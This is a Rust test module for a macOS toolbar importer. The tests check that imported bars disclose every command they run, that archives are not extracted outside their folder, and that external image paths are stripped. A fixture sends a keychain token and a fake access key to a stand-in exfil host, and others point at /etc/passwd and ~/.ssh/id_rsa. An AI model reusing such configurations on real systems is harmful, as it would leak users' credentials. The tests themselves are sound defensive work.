        assert!(avis.iter().any(|a| a.starts_with("élément 4 : cet [[element]] est écrit après un [[application]]")), "{avis:?}");
        let anglais = resume(&paquet, &d.join("b.zip"), false);
        assert!(anglais.contains("\nattention : élément 3 : aucune [[source]]"), "{anglais}");
        assert!(!anglais.contains("warning:"), "un avis en français garde son préfixe français : {anglais}");
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn resume_dans_les_deux_langues() {
        let paquet = ouvrir_octets(
            b"[[element]]\ntype = \"bouton\"\ntexte = \"Build\"\naction = { shell = \"make\" }\n\n[[element]]\ntype = \"souple\"\n\n\
              [[application]]\napp = \"Safari\"\n[[application.element]]\ntype = \"souple\"\n"
                .to_vec(),
            None,
        )
        .unwrap();
        let fichier = Path::new("/tmp/b.toml");
        assert_eq!(
            resume(&paquet, fichier, true),
            "Barre de /tmp/b.toml : 2 éléments, 1 barre d'application (Safari).\nCe que cette barre fait sur ton Mac :\n  Barre principale, élément 1 « Build » · Commande shell : make"
        );
        assert_eq!(
            resume(&paquet, fichier, false),
            "Bar from /tmp/b.toml: 2 items, 1 app bar (Safari).\nWhat this bar does on your Mac:\n  Main bar, item 1 “Build” · Shell command: make"
        );
        let seul = ouvrir_octets(b"[[element]]\ntype = \"souple\"\n".to_vec(), None).unwrap();
        assert_eq!(resume(&seul, fichier, false), "Bar from /tmp/b.toml: 1 item.\nIt runs no commands.");
        assert!(resume(&seul, fichier, true).ends_with("Elle ne lance aucune commande."));
    }

    /// Rien de ce qu'une barre peut lancer n'échappe à la liste montrée avant l'import : chaque `shell`, `applescript`,
    /// `app` d'action ou de lanceur et chaque commande de script d'une barre générée y est, cherché dans son JSON.
    #[test]
    fn aucune_commande_cachee_dans_des_barres_generees() {
        fn cherche(v: &serde_json::Value, trouves: &mut Vec<String>) {
            match v {
                serde_json::Value::Object(o) => {
                    let barre_d_app = o.contains_key("element") && !o.contains_key("type");
                    for (cle, valeur) in o {
                        match (cle.as_str(), valeur) {
                            ("app", _) if barre_d_app => {}
                            ("shell" | "applescript" | "app" | "commande" | "http", serde_json::Value::String(s)) => trouves.push(s.clone()),
                            // Un en-tête : sa ligne `Nom: valeur`, montrée telle quelle (trousseau compris), quand la
                            // source a une adresse où l'envoyer (sans adresse, il n'est ni lu ni envoyé).
                            ("entetes", serde_json::Value::Object(e)) if o.get("http").is_some_and(|u| u.is_string()) || o.get("mcp").and_then(|m| m.get("url")).is_some_and(|u| u.is_string()) => trouves.extend(e.iter().map(|(n, v)| format!("{n}: {}", v.as_str().unwrap_or_default()))),
                            _ => cherche(valeur, trouves),
                        }
                    }
                }
                serde_json::Value::Array(a) => a.iter().for_each(|x| cherche(x, trouves)),
                _ => {}
            }
        }
        for graine in 0..300 {
            let barre = crate::essais::Hasard::new(graine).barre();
            let valeurs: Vec<String> = commandes(&barre).into_iter().map(|c| c.valeur).collect();
            let mut attendues = Vec::new();
            cherche(&serde_json::to_value(&barre).unwrap(), &mut attendues);
            for a in attendues {
                assert!(valeurs.contains(&a), "graine {graine} : « {a} » absent de {valeurs:?}");
            }
        }
    }

    /// Des archives tronquées ou mutées octet par octet : `ouvrir_octets` refuse ou accepte, sans jamais paniquer, et
    /// tout ce qu'il écrit reste dans son dossier temporaire.
    #[test]
    fn archives_abimees_sans_panique_ni_ecriture_hors_dossier() {
        let d = dossier_essai("abimees");
        let mut bases = Vec::new();
        for (k, methode) in [zip::CompressionMethod::Stored, zip::CompressionMethod::Deflated].into_iter().enumerate() {
            let z = d.join(format!("base{k}.zip"));
            let mut w = zip::ZipWriter::new(std::fs::File::create(&z).unwrap());
            let options = zip::write::SimpleFileOptions::default().compression_method(methode);
            let toml = b"[[element]]\ntype = \"bouton\"\ntexte = \"x\"\nimage = \"icones/a.png\"\n[[element]]\ntype = \"bouton\"\ntexte = \"y\"\nimage = \"icones/b.png\"\n";
            for (nom, contenu) in [("barre.toml", &toml[..]), ("icones/a.png", &crate::barre::png_annonce(2, 2)), ("icones/b.png", &crate::barre::png_annonce(3, 3)), ("notes.txt", b"x")] {
                w.start_file(nom, options).unwrap();
                w.write_all(contenu).unwrap();
            }
            w.finish().unwrap();
            bases.push(std::fs::read(&z).unwrap());
        }
        let mut h = crate::essais::Hasard::new(42);
        let (mut acceptees, mut refusees) = (0, 0);
        for k in 0..600 {
            let mut octets = h.parmi(&bases).clone();
            match h.jusqua(3) {
                0 => octets.truncate(h.jusqua(octets.len())),
                1 => {
                    for _ in 0..1 + h.jusqua(4) {
                        let i = h.jusqua(octets.len());
                        octets[i] = h.suivant() as u8;
                    }
                }
                _ => {
                    // Un nom d'entrée réécrit : `..`, `/`, `\` ou `:` glissés dans le répertoire central.
                    let i = octets.windows(6).rposition(|w| w == b"icones").unwrap_or(0);
                    octets[i..i + 6].copy_from_slice(*h.parmi(&[b"../../", b"/tmp//", b"..\\..\\", b"C:/xxx", b"icon/.", b"..icon"]));
                }
            }
            match crate::essais::sans_panique(|| ouvrir_octets(octets.clone(), None)).unwrap_or_else(|p| panic!("cas {k} : panique « {p} »")) {
                Ok(paquet) => {
                    acceptees += 1;
                    let temporaire = paquet.temporaire.clone().unwrap();
                    for source in &paquet.sources {
                        assert!(Path::new(source).starts_with(&temporaire), "cas {k} : {source} hors de {}", temporaire.display());
                    }
                }
                Err(_) => refusees += 1,
            }
        }
        assert!(acceptees > 10 && refusees > 100, "{acceptees} acceptées, {refusees} refusées");
        std::fs::remove_dir_all(&d).unwrap();
    }

    /// Des noms d'entrée composés au hasard : une archive n'est acceptée que si aucun nom ne sort de son dossier.
    #[test]
    fn noms_d_entree_generes() {
        let d = dossier_essai("noms");
        let mut h = crate::essais::Hasard::new(3);
        for k in 0..300 {
            let morceaux = ["..", ".", "icones", "x.png", "a..b.png", "/", "\\", "C:", "", " ", "barre.toml", "~"];
            let nom: String = (0..1 + h.jusqua(4)).map(|_| *h.parmi(&morceaux)).collect::<Vec<_>>().join(if h.pile() { "/" } else { "" });
            if nom.is_empty() || nom == "barre.toml" {
                continue;
            }
            let z = d.join(format!("{k}.zip"));
            archive(&z, &[("barre.toml", SIMPLE), (&nom, &crate::barre::png_annonce(1, 1))], None);
            let dangereux = nom.starts_with(['/', '\\']) || nom.as_bytes().get(1) == Some(&b':') || nom.split(['/', '\\']).any(|c| c == "..");
            match ouvrir(&z) {
                Ok(paquet) => {
                    assert!(!dangereux, "« {nom} » accepté");
                    let temporaire = paquet.temporaire.clone().unwrap();
                    assert!(paquet.sources.iter().all(|s| Path::new(s).starts_with(&temporaire)));
                }
                Err(e) => assert!(dangereux || e.fr.contains("illisible"), "« {nom} » refusé : {}", e.fr),
            }
        }
        std::fs::remove_dir_all(&d).unwrap();
    }

    /// La barre piège de Karim (revue 0.3, trouvaille 1) : un en-tête `trousseau:` envoie un secret à une adresse tierce.
    const PIEGE: &[u8] = b"[[element]]\ntype = \"texte\"\nsource = \"x\"\ngabarit = \"{texte}\"\n\n\
        [[source]]\nnom = \"x\"\nhttp = \"https://exfil.example.com/collecte\"\ntoutes_les = 5\n\
        entetes = { Authorization = \"Bearer trousseau:github-token\", X-Note = \"ma_cle_en_clair_AKIA1234567890ABCDEF\" }\n";

    fn lignes(barre: &Barre) -> Vec<(String, String, String)> {
        commandes(barre).into_iter().map(|c| (c.ou.fr, c.quoi.fr, c.valeur)).collect()
    }

    /// S1 : chaque en-tête est montré, et un `trousseau:` dit quel mot de passe part, et vers où.
    #[test]
    fn le_trousseau_envoye_ailleurs_est_montre_et_signale() {
        let paquet = ouvrir_octets(PIEGE.to_vec(), None).unwrap();
        let liste: Vec<(String, String, String)> = paquet.commandes.iter().map(|c| (c.ou.fr.clone(), c.quoi.fr.clone(), c.valeur.clone())).collect();
        let attendu = [
            ("Source « x »", "Adresse lue toutes les 5 s", "https://exfil.example.com/collecte"),
            ("Source « x »", "Lit ton mot de passe enregistré « github-token » et l’envoie à exfil.example.com", "Authorization: Bearer trousseau:github-token"),
            ("Source « x »", "En-tête envoyé à exfil.example.com", "X-Note: ma_cle_en_clair_AKIA1234567890ABCDEF"),
        ]
        .map(|(a, b, c)| (a.to_string(), b.to_string(), c.to_string()));
        assert_eq!(liste, attendu);
        assert_eq!(paquet.commandes[1].quoi.en, "Reads your saved password “github-token” and sends it to exfil.example.com");
        // Le résumé de la ligne de commande commence par l'alerte, dans les deux langues.
        let fichier = Path::new("/tmp/piege.toml");
        let fr = resume(&paquet, fichier, true);
        assert_eq!(fr.lines().nth(1), Some("⚠ Attention : cette barre lit ton mot de passe enregistré « github-token » et l’envoie à exfil.example.com. Ne l’importe que si tu as confiance en son auteur."), "{fr}");
        let en = resume(&paquet, fichier, false);
        assert_eq!(en.lines().nth(1), Some("⚠ Warning: this bar reads your saved password “github-token” and sends it to exfil.example.com. Only import it if you trust its author."), "{en}");
        // Vers cette machine : le secret ne sort pas, il est listé sans alerte.
        let local = ouvrir_octets(b"[[source]]\nnom = \"l\"\nhttp = \"http://127.0.0.1:8080/x\"\nentetes = { A = \"trousseau:moi\" }\n[[element]]\ntype = \"souple\"\n".to_vec(), None).unwrap();
        assert_eq!(lignes(&local.barre)[1].1, "Lit ton mot de passe enregistré « moi » et l’envoie à 127.0.0.1");
        assert!(!resume(&local, fichier, true).contains('⚠'));
        // Un serveur MCP distant aussi reçoit les en-têtes ; deux secrets dans une valeur : deux lignes.
        let mcp = config::lire("[[source]]\nnom = \"m\"\nmcp = { url = \"https://a:b@mcp.example.org:8443/mcp?x=1\", outil = \"o\" }\nentetes = { A = \"trousseau:un trousseau:deux\" }\n").unwrap();
        let l = lignes(&mcp);
        assert_eq!(l[1].1, "Lit ton mot de passe enregistré « un » et l’envoie à mcp.example.org");
        assert_eq!(l[2].1, "Lit ton mot de passe enregistré « deux » et l’envoie à mcp.example.org");
    }

    /// S2 : ce qu'une barre lit, exécute ou appelle, pour chaque sorte d'élément, d'action et de source.
    #[test]
    fn tout_ce_que_la_barre_fait_est_liste() {
        let barre = config::lire(
            "[[element]]\ntype = \"bouton\"\ntexte = \"a\"\nimage = \"/etc/passwd\"\n\n\
             [[element]]\ntype = \"bouton\"\ntexte = \"b\"\nimage = \"~/.ssh/id_rsa\"\n\n\
             [[element]]\ntype = \"bouton\"\ntexte = \"c\"\nimage = \"icones/c.png\"\n\n\
             [[element]]\ntype = \"bouton\"\naction = { url = \"ssh://serveur\" }\n",
        )
        .unwrap();
        let attendu = [
            ("Barre principale, élément 1 « a »", "Lit un fichier de ton Mac", "/etc/passwd"),
            ("Barre principale, élément 2 « b »", "Lit un fichier de ton Mac", "~/.ssh/id_rsa"),
            ("Barre principale, élément 4", "Ouvre l’adresse", "ssh://serveur"),
        ]
        .map(|(a, b, c)| (a.to_string(), b.to_string(), c.to_string()));
        assert_eq!(lignes(&barre), attendu);
    }

    /// S4 : à l'import, une image hors de la barre importée (`/…`, `~/…`, chemin relatif autre que `icones/`) est
    /// retirée et dite ; le bouton garde son texte, ou prend un symbole. Une barre locale, elle, garde ses chemins.
    #[test]
    fn image_hors_de_la_barre_importee_retiree() {
        let texte = "[[element]]\ntype = \"bouton\"\ntexte = \"a\"\nimage = \"/etc/passwd\"\n\
                     [[element]]\ntype = \"bouton\"\nimage = \"~/.ssh/id_rsa\"\n\
                     [[element]]\ntype = \"groupe\"\n  [[element.element]]\n  type = \"bouton\"\n  symbole = \"star\"\n  image = \"../x.png\"\n";
        let paquet = ouvrir_octets(texte.as_bytes().to_vec(), None).unwrap();
        let mut restantes = Vec::new();
        chaque_image(&mut paquet.barre.clone(), &mut |i| restantes.push(i.clone()));
        assert!(restantes.is_empty(), "{restantes:?}");
        match &paquet.barre.elements[..] {
            [Element::Bouton { texte: Some(t), symbole: None, .. }, Element::Bouton { texte: None, symbole: Some(s), .. }, Element::Groupe { elements, .. }] => {
                assert_eq!((t.as_str(), s.as_str()), ("a", "photo"));
                assert!(matches!(&elements[..], [Element::Bouton { symbole: Some(s), image: None, .. }] if s == "star"));
            }
            autre => panic!("{autre:?}"),
        }
        let avis: Vec<&str> = paquet.avis.iter().map(|a| a.fr.as_str()).collect();
        assert!(avis.contains(&"image ignorée : chemin hors de la barre importée (/etc/passwd, ~/.ssh/id_rsa, ../x.png)"), "{avis:?}");
        assert!(paquet.avis.iter().any(|a| a.en == "image ignored: path outside the imported bar (/etc/passwd, ~/.ssh/id_rsa, ../x.png)"));
        assert!(paquet.commandes.is_empty(), "{:?}", paquet.commandes);
        // La barre de l'utilisateur, lue par `config`, n'est pas concernée.
        assert!(matches!(&config::lire(texte).unwrap().elements[0], Element::Bouton { image: Some(i), .. } if i == "/etc/passwd"));
    }
}
